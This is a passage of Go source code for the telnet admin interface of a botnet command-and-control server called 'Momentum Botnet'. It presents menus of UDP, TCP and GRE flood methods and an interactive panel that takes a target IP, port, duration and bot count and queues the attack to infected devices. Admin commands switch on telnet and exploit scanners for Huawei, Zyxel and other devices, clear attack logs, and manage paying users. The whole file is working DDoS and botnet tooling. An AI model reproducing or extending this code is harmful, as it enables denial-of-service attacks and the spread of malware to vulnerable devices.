package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "math/rand"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
  this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
  defer func() {
    this.conn.Write([]byte("\033[0m\033[?1049l"))
  }()

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("telnet: Unable to connect to remote host: Connection refused.\r\n"))
    this.conn.Write([]byte(""))
  username, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(60 * time.Second))
  this.conn.Write([]byte(""))
  password, err := this.ReadLine(false)
  if err != nil {
    return
  }

  this.conn.SetDeadline(time.Now().Add(120 * time.Second))

  var loggedIn bool
  var userInfo AccountInfo
  if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
    buf := make([]byte, 1)
    this.conn.Read(buf)
    return
  }

    var code int
    code = (rand.Intn(9) + 1) * 20 + (rand.Intn(9) + 1) * 20 + (rand.Intn(9) + 1) * 20 + rand.Intn(10)
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("Captcha code (" + strconv.Itoa(code) + ")\033[1;97m: \033[0m"))
    pin, err := this.ReadLine(false)

    if(err != nil || len(pin) > 10){
        this.conn.Write([]byte("\r\033[1;91myour ip has been logged\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    cc, err := strconv.Atoi(pin)
    if(err != nil || cc != code){
        this.conn.Write([]byte("\r\033[1;91myour ip has been logged\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[93mAuthentication successful \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Loaded: %d | User: %s | Registred user: %d\007", BotCount, username, database.fetchUsers()))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
            t := time.Now()
            formatedTime := t.Format(time.RFC1123)
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
            // banner
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;91m\033[37mWelcome \033[1;91m"+ username +"\033[37m into the \033[1;91mMomentum Botnet\033[37m.\r\n\033[37mLogged at: \033[1;91m%s", formatedTime)))
            this.conn.Write([]byte(fmt.Sprintf("\r\n\033[37mThe net actually have \033[1;91m%d \033[37mbots online.\r\n", BotCount)))
          for {           

        // PS1
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[1;91m\033[37m"+ username +"\033[1;91m@\033[37mmomentum\033[1;91m:\033[37m "))
        cmd, err := this.ReadLine(false)
        
        // clear screen ||b
        if cmd == "clear" || cmd == "cls" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;91m\033[37mWelcome \033[1;91m"+ username +"\033[37m into the \033[1;91mMomentum Botnet\033[37m.\r\n\033[37mLogged at: \033[1;91m%s", formatedTime)))
            this.conn.Write([]byte(fmt.Sprintf("\r\n\033[37mThe net actually have \033[1;91m%d \033[37mbots online.\r\n", BotCount)))            
            continue
        }

        // methods menu
        if cmd == "methods" {
            this.conn.Write([]byte("\033[38;5;46mMomentumNetwork -Attack methods Avaiable\033[37m\r\n\033[1;91mvoltudp\033[37m: UDP flood optimized for high GBPS. (UDP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91movhudp\033[37m: Special OVH UDP flood. (UDP LAYER 4)\033[31m perfect for game\r\n"))
            this.conn.Write([]byte("\033[1;91mudpkick\033[37m: UDP flood with payload. (UDP LAYER 4)\033[31m perfect for game\r\n"))
            this.conn.Write([]byte("\033[1;91mvse\033[37m: Valve Source Engine flood based on Steam. (UDP LAYER 4)\033[31m perfect for game\r\n"))
            this.conn.Write([]byte("\033[1;91mstormudp\033[37m: UDP flood optimized for high GBPS. (UDP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mxenudp\033[37m: UDP flood optimized for high PPS. (UDP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mstd\033[37m: Standard UDP flood optimized for high GBPS. (UDP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mstdhex\033[37m: Standard UDP flood customized. (UDP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mudp\033[37m: Customized UDP flood. (UDP LAYER 4)\033[31m PERFECT for game\r\n"))
            this.conn.Write([]byte("\033[1;91mudphex\033[37m: Strong Random UDP flood HEX packet. (UDP LAYER 4)\033[31m perfect for game\r\n"))
            this.conn.Write([]byte("\033[1;91mplainudp\033[37m: UDP flood optimized for high PPS. (UDP LAYER 4)\r\n\r\n"))
            this.conn.Write([]byte("\033[1;91mstomp\033[37m: TCP Stomp flood. (TCP LAYER 4 - open ports)\r\n"))
            this.conn.Write([]byte("\033[1;91mack\033[37m: TCP ACK flood optimized & mixed for high PPS/GBPS. (TCP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mhardtcp\033[37m: TCP mixed flood optimized for high PPS. (TCP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91mtcplain\033[37m: TCP raw/plain flood optimized for high PPS. (TCP LAYER 4)\r\n"))
            this.conn.Write([]byte("\033[1;91murgplain\033[37m: TCP raw/plain flood optimized for high PPS. (TCP LAYER 4)\r\n\r\n"))
            this.conn.Write([]byte("\033[1;91mgre\033[37m: GREIP flood. (LAYER 3)\r\n"))
            continue
        } 


                           //0 = CLIENT ACCOUNT
        if userInfo.admin == 0 &&  cmd == "stats" { // 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[38;5;46mInformation about your current plan:\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mUsername\033[1;91m: "+ username +"\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mBots allowed\033[1;91m: %d\r\n", database.maxBots(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mBots online\033[1;91m: %d\r\n", clientList.Count())))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mAccount type\033[1;91m: client\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mMax boot time\033[1;91m: %d\r\n", database.maxBootTime(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mCooldown\033[1;91m: %d\r\n\r\n", database.fetchCooldown(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mTotal users on the network: %d", database.fetchUsers())))
            this.conn.Write([]byte(fmt.Sprintf("\033[31mPlan can be upgraded to RESELLER, u just pay the difference.\r\n")))
            continue
        }
                           //1 = ADMIN ACCOUNT
        if userInfo.admin == 1 && cmd == "stats" { 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[38;5;46mInformation about your current plan:\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mUsername\033[1;91m: "+ username +"\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mBots allowed\033[1;91m: %d\r\n", database.maxBots(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mBots online\033[1;91m: %d\r\n", clientList.Count())))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mAccount type\033[1;91m: admin\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mMax boot time\033[1;91m: %d\r\n", database.maxBootTime(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mCooldown\033[1;91m: %d\r\n\r\n", database.fetchCooldown(username))))
            this.conn.Write([]byte(fmt.Sprintf("\033[37mTotal users on the network: %d\r\n", database.fetchUsers())))
            continue
        }

        if cmd == "help" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            this.conn.Write([]byte("\033[38;5;46mAdditionals Helping commands:\r\n"))
            this.conn.Write([]byte("\033[1;91mpanel\033[37m: Panel for send DDoS attack fastly.\r\n"))
            this.conn.Write([]byte("\033[1;91mmethods\033[37m: Attack command list.\r\n"))
            this.conn.Write([]byte("\033[1;91mlookup\033[37m: Lookup IP address.\r\n"))
            this.conn.Write([]byte("\033[1;91mscanport\033[37m: Scanning port of the target.\r\n"))
            this.conn.Write([]byte("\033[1;91mnmap\033[37m: Scanning port of the target.\r\n"))
            this.conn.Write([]byte("\033[1;91mbots\033[37m: See bot counts.\r\n"))
            this.conn.Write([]byte("\033[1;91mstats\033[37m: See your account informations.\r\n"))
            this.conn.Write([]byte("\033[1;91minfos\033[37m: Pre-made command for complexe Game-flood.\r\n"))
            this.conn.Write([]byte("\033[1;91mquit\033[37m: Logout from the Network.\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\r\n\033[1;91madduser\033[37m: Adding user on the net.\r\n"))
            this.conn.Write([]byte("\033[1;91mremuser\033[37m: Remove user on the net.\r\n"))
            this.conn.Write([]byte("\033[1;91maddadmin\033[37m: Add admin user on the net.\r\n"))
            this.conn.Write([]byte("\033[1;91mtelnet <\033[32mon\033[37m/\033[31moff>\033[37m: Starting telnet scanner.\r\n"))
            this.conn.Write([]byte("\033[1;91mexploit <\033[32mon\033[37m/\033[31moff>\033[37m: Starting exploit scanner.\r\n"))
            this.conn.Write([]byte("\033[1;91mclearlogs\033[37m: Clear all logs of attack.\r\n\r\n"))
            continue
        }
        if userInfo.admin == 0 && cmd == "admin" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }
        if cmd == "" {
            continue
        }

        if err != nil || cmd == "exit" || cmd == "quit" {
            this.conn.Write([]byte("\033[93mCiao.\r\n"))
            return
        }

         if userInfo.admin == 0 && cmd == "clearlogs" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "clearlogs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs from database? (better for stability) \033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }

         if userInfo.admin == 1 && cmd == "telnet"  {
            this.conn.Write([]byte(" \033[1;91mStart or disasble the Telnet Scanner? \033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if confirm == "n" {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mTelnet Scanner is disabled.\r\n")))
            fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] TelnetScanner Stopped by \033[1;92m" + username + " \033[1;91m!\r\n")
            } else {
                this.conn.Write([]byte("\033[1;92mTelnet Scanner has been Started on all Devices infected.\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] TelnetScanner Started by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }

        if userInfo.admin == 1 && cmd == "exploit" {
                this.conn.Write([]byte("\033[1;91mHuawei:\033[1;92mON\033[1;91m\r\nZyxel:\033[1;92mON\r\n\033[1;91mTR-064:\033[1;92mON\033[1;91m\r\nThinkPHP:\033[1;91mOFF\033[1;91m\r\nJaws:\033[1;92mON\r\n\033[1;91mFor more SelfRep/Exploit, contact BadWolf.\r\n"))
                continue
        }

        if userInfo.admin == 0 && cmd == "exploit" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
                continue
        }

        if cmd == "scanport" || cmd == "nmap"{
            this.conn.Write([]byte("Enter Target IP: "))
            target_ip, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(getNMAP(target_ip) + "\r\n"))
            continue
        }

        if cmd == "lookup" || cmd == "geo" {
            this.conn.Write([]byte("Enter Target IP: "))
            target_ip, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(getGEO(target_ip) + "\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N):"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;92mBasic User Added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 0 && cmd == "addamin" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 0 && cmd == "adduser" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 0 && cmd == "telnet" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 0 && cmd == "exploit" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }
       
        if userInfo.admin == 0 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }
        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N):"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[1;92mSuper Admin added successfully.\033[0m\r\n"))
            }
            continue
        }

          if userInfo.admin == 0 && cmd == "remuser" {
            this.conn.Write([]byte("\033[91myou are not admin.\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "remuser" {
            this.conn.Write([]byte("\033[1;91mUsername: \033[0m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;91mDefinitively kill this account ? \033[1;36m" + rm_un + "\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to Remove User, maybe don't exist or DB Error\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mUser Successfully Banned/Removed!\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("        \033[38;5;160m╔╦╗  ╔═╗  ╔╦╗  ╔═╗  ╔╗╔  ╔╦╗  ╦ ╦  ╔╦╗\r\n"))
            this.conn.Write([]byte("        \033[38;5;161m║║║  ║ ║  ║║║  ║╣   ║║║   ║   ║ ║  ║║║\r\n"))
            this.conn.Write([]byte("        \033[38;5;162m╩ ╩  ╚═╝  ╩ ╩  ╚═╝  ╝╚╝   ╩   ╚═╝  ╩ ╩\r\n"))
            this.conn.Write([]byte("             \033[38;5;162m ╔╗╔  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╦═╗  ╦╔═\r\n"))
            this.conn.Write([]byte("             \033[38;5;161m ║║║  ║╣    ║   ║║║  ║ ║  ╠╦╝  ╠╩╗\r\n"))
            this.conn.Write([]byte("             \033[38;5;160m ╝╚╝  ╚═╝   ╩   ╚╩╝  ╚═╝  ╩╚═  ╩ ╩\r\n\r\n"))
            for k, v := range m {
                if k == "" || k == "RCE" || k == "e" {
                    k = "FAKE";
                }
                this.conn.Write([]byte(fmt.Sprintf(" \033[1;97m[\033[1;93m%s\033[1;97m]\033[1;97m: [%d]\r\n", k, v)))
                }
            continue
        }
        
        if cmd == "panel" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;91m\r\n"))
            this.conn.Write([]byte("\033[1;91m*Available Attacks Methods*\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mUDP           \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mSTD           \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mSTDHEX        \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mUDPHEX        \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mSTORMUDP      \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mXENUDP        \033[0;97m| \033[0;97mUDP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mUDPKICK       \033[0;97m| \033[0;97mUDP GAME Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mVSE           \033[0;97m| \033[0;97mUDP GAME Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mOVHUDP        \033[0;97m| \033[0;97mUDP GAME / OVH Special Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mSTOMP         \033[0;97m| \033[0;97mTCP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mACK           \033[0;97m| \033[0;97mFIVEM ACK TCP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mHARDTCP       \033[0;97m| \033[0;97mTCP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mTCPPLAIN      \033[0;97m| \033[0;97mTCP Flood\r\n"))
            this.conn.Write([]byte("\033[1;91m\r\n"))
            this.conn.Write([]byte("\033[1;91m\033[1;97mMethod: "))
            amethod, err := this.ReadLine(false)
            if err != nil {
                return
            }   
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;97mIP: "))
            aip, err := this.ReadLine(false)
            if err != nil {
                return
            } 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;97mPort: "))
            aport, err := this.ReadLine(false)
            if err != nil {
                return
            }   
            this.conn.Write([]byte("\r\n"))

            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;97mTime: "))
            atime, err := this.ReadLine(false)
            if err != nil {
                return
            }   

             this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[1;97mBots Count: "))
            abotcount, err := this.ReadLine(false)
            if err != nil {
                return
            }   
           var s int
            if _, err := fmt.Sscanf(abotcount, "%d", &s); err == nil {
            full_attack := strings.ToLower(amethod) + " " + " " + strings.ToLower(aip) + " " + strings.ToLower(atime) + " dport=" + strings.ToLower(aport) 
            this.conn.Write([]byte("\033[2J\033[1H"))
            atk, err := NewAttack(full_attack, userInfo.admin)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                buf, err := atk.Build()
                if err != nil {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else {
                    if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, s, 0); !can {
                        this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                    } else if !database.ContainsWhitelistedTargets(atk) {
                        clientList.QueueBuf(buf, s, botCatagory)
                        this.conn.Write([]byte("\033[2J\033[1;1H"))
                        this.conn.Write([]byte(fmt.Sprintf("\033[38;5;196m%d Bots attacking "+aip+" with "+amethod+" method.\r\n", s)))
                        fmt.Println("\033[1;93mCommand sent by \033[1;91m[" + username + "]\033[1;92m bot sent: %d - \033[1;91m%s", s, botCatagory)
                        continue
                    } else {
                        this.conn.Write([]byte(fmt.Sprintf("\033[0;95mThis \033[0;97mIP \033[0;94mhas \033[0;97mbeen \033[0;94mblack \033[0;97mlisted \033[0;94mby \033[0;97m"+ username +"!\r\n")))
                    }
                }
            }
        }
    }

        botCount = userInfo.maxBots

        if cmd[0] == '°' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '°' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }
        
        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var AttackCount int
                        if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        AttackCount = userInfo.maxBots
